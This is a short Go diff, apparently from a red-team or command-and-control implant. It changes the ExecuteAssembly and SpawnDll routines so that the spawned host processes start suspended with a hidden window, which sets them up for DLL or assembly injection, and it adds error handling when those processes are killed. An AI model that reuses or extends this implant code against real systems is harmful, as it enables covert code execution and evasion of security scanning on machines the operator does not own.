@@ -197,7 +197,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	log.Println("[*] Hosting dll size:", len(hostingDll))
 	// {{end}}
 	var stdoutBuf, stderrBuf bytes.Buffer
-	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf)
+	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Debug}}
 		log.Println("Could not start process:", process)
@@ -260,7 +260,13 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	if err != nil {
 		return "", err
 	}
-	cmd.Process.Kill()
+	err = cmd.Process.Kill()
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("Error kill: %v\n", err)
+		// {{end}}
+		return "", err
+	}
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
@@ -272,7 +278,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	var stdoutBuff bytes.Buffer
 	var stderrBuff bytes.Buffer
 	// 1 - Start process
-	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff)
+	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
 	if err != nil {
 		return "", err
 	}
@@ -348,7 +354,7 @@ func refresh() error {
 	return nil
 }
 
-func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer) (*exec.Cmd, error) {
+func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
 	cmd := exec.Command(proc)
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(CurrentToken),
@@ -357,6 +363,9 @@ func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer) (*exe
 	cmd.Stderr = stderr
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		HideWindow: true,
+	}
+	if suspended {
+		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
 	}
 	err := cmd.Start()
 	if err != nil {
